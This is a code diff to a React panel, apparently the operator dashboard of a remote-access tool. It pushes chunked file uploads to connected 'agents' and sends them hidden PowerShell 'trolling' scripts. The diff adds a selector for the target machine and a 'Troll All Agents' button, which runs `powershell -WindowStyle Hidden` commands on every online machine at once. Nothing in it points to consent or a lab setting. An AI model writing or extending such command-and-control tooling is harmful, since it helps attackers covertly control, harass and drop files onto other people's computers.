@@ -4,9 +4,10 @@ import { Input } from './ui/input';
 import { Label } from './ui/label';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
 import { Alert, AlertDescription } from './ui/alert';
-import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2, Square } from 'lucide-react';
+import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2, Square, Users } from 'lucide-react';
 import { useSocket } from './SocketProvider';
 import { Progress } from './ui/progress';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
 
 interface UploadedFile {
   id: string;
@@ -26,7 +27,7 @@ interface TrollingScript {
 }
 
 export function BulkUploadManager() {
-  const { socket, selectedAgent } = useSocket();
+  const { socket, selectedAgent, agents } = useSocket() as any;
   const [files, setFiles] = useState<UploadedFile[]>([]);
   const [folderPath, setFolderPath] = useState('');
   const [isDragging, setIsDragging] = useState(false);
@@ -39,6 +40,14 @@ export function BulkUploadManager() {
   const [trollVolume, setTrollVolume] = useState(100);
   const [trollLoop, setTrollLoop] = useState(true);
   const [trollAutoClose, setTrollAutoClose] = useState(0);
+  const [targetAgentId, setTargetAgentId] = useState<string | null>(null);
+  const onlineAgents = (agents || []).filter((a: any) => a?.status === 'online');
+  useEffect(() => {
+    if (!targetAgentId) {
+      if (selectedAgent) setTargetAgentId(selectedAgent);
+      else if (onlineAgents.length > 0) setTargetAgentId(onlineAgents[0].id);
+    }
+  }, [selectedAgent, agents]);
 
   const generateImageTrollingScript = (imagePath: string): string => {
     return `Add-Type -AssemblyName PresentationFramework
@@ -223,8 +232,9 @@ $w.ShowDialog()`;
     return `${m}:${ss.toString().padStart(2, '0')}`;
   };
 
-  const uploadFile = async (file: UploadedFile) => {
-    if (!socket || !selectedAgent) {
+  const uploadFile = async (file: UploadedFile, agentOverride?: string | null) => {
+    const agentId = agentOverride ?? targetAgentId ?? selectedAgent ?? (onlineAgents[0]?.id || null);
+    if (!socket || !agentId) {
       setError('No agent selected');
       return;
     }
@@ -236,7 +246,7 @@ $w.ShowDialog()`;
       const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
       const destination = file.path || `C:\\Users\\${file.name}`;
       socket.emit('upload_file_start', {
-        agent_id: selectedAgent,
+        agent_id: agentId,
         upload_id: uploadId,
         filename: file.name,
         destination,
@@ -250,7 +260,7 @@ $w.ShowDialog()`;
           const bytes = new Uint8Array(buffer);
           const chunkB64 = bytesToBase64(bytes);
           socket.emit('upload_file_chunk', {
-            agent_id: selectedAgent,
+            agent_id: agentId,
             upload_id: uploadId,
             chunk: chunkB64,
             offset,
@@ -263,7 +273,7 @@ $w.ShowDialog()`;
           const slice = binaryString.slice(i, i + chunkSize);
           const chunkB64 = btoa(slice);
           socket.emit('upload_file_chunk', {
-            agent_id: selectedAgent,
+            agent_id: agentId,
             upload_id: uploadId,
             chunk: chunkB64,
             offset: i,
@@ -283,7 +293,7 @@ $w.ShowDialog()`;
         socket.on('file_upload_complete', handler);
       });
       socket.emit('upload_file_complete', {
-        agent_id: selectedAgent,
+        agent_id: agentId,
         upload_id: uploadId,
       });
       await completionPromise;
@@ -305,6 +315,7 @@ $w.ShowDialog()`;
       const readyHandler = (data: any) => {
         if (String(data?.upload_id || '') !== uploadId) return;
         socket.off('troll_asset_ready', readyHandler);
+        socket.off('troll_asset_progress', progressHandler);
         if (data?.error) reject(new Error(String(data.error)));
         else if (data?.url) resolve(String(data.url));
         else reject(new Error('No URL generated'));
@@ -359,8 +370,8 @@ $w.ShowDialog()`;
     });
   };
 
-  const startTrolling = async (file: UploadedFile) => {
-    if (!socket || !selectedAgent) {
+  const startTrollingForAgent = async (file: UploadedFile, agentId: string | null) => {
+    if (!socket || !agentId) {
       setError('No agent selected');
       return;
     }
@@ -385,16 +396,21 @@ $w.ShowDialog()`;
 
     try {
       socket.emit('command', {
-        agent_id: selectedAgent,
+        agent_id: agentId,
         command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
         execution_id: `trolling-${Date.now()}`
       });
       
-      setSuccess(`Trolling started with ${file.name}`);
+      setSuccess(`Trolling started with ${file.name} on ${agentId}`);
       
     } catch (err) {
       setError(`Trolling failed: ${err}`);
     }
+  };
+  
+  const startTrolling = async (file: UploadedFile) => {
+    const agentId = targetAgentId ?? selectedAgent ?? (onlineAgents[0]?.id || null);
+    await startTrollingForAgent(file, agentId);
   };
   
   useEffect(() => {
@@ -528,6 +544,25 @@ $w.ShowDialog()`;
           
           <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
             <div className="space-y-2">
+              <Label className="flex items-center gap-2"><Users className="h-3 w-3" />Target Agent</Label>
+              <Select value={targetAgentId ?? ''} onValueChange={(v) => setTargetAgentId(v)}>
+                <SelectTrigger className="w-full">
+                  <SelectValue placeholder={targetAgentId ?? 'Select agent'} />
+                </SelectTrigger>
+                <SelectContent>
+                  {onlineAgents.map((a: any) => (
+                    <SelectItem key={a.id} value={a.id}>{a.name || a.id}</SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+              <div className="text-xs text-muted-foreground">
+                {onlineAgents.length === 0 ? 'No online agents' : `Online: ${onlineAgents.length}`}
+              </div>
+            </div>
+          </div>
+          
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div className="space-y-2">
               <Label>Volume</Label>
               <Input
                 type="range"
@@ -592,15 +627,37 @@ $w.ShowDialog()`;
 
           {files.length > 0 && (
             <div className="space-y-2">
-              <div className="flex justify-between items-center">
-                <h4 className="font-medium">Selected Files ({files.length})</h4>
-                <Button
+                <div className="flex justify-between items-center">
+                  <h4 className="font-medium">Selected Files ({files.length})</h4>
+                  <Button
                   onClick={uploadAllFiles}
-                  disabled={isUploading || !selectedAgent}
+                  disabled={isUploading || (!targetAgentId && onlineAgents.length === 0)}
                   size="sm"
                 >
                   <Upload className="h-4 w-4 mr-2" />
                   Upload All
+                </Button>
+              </div>
+              <div className="flex items-center gap-2">
+                <Button
+                  size="sm"
+                  variant="outline"
+                  disabled={isUploading || files.length === 0 || onlineAgents.length === 0}
+                  onClick={async () => {
+                    setError('');
+                    setSuccess('');
+                    for (const a of onlineAgents) {
+                      // Troll first file for all agents
+                      try {
+                        await startTrollingForAgent(files[0], a.id);
+                      } catch (e) {
+                        setError(`Troll failed for ${a.id}: ${String(e)}`);
+                      }
+                    }
+                  }}
+                  title="Troll all online agents with first selected file"
+                >
+                  Troll All Agents
                 </Button>
               </div>
               
@@ -715,7 +772,7 @@ if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPt
             </div>
           )}
 
-          {!selectedAgent && (
+          {!((targetAgentId ?? selectedAgent) || onlineAgents.length > 0) && (
             <Alert>
               <AlertDescription>
                 Please select an agent from the Agents tab to upload files and start trolling
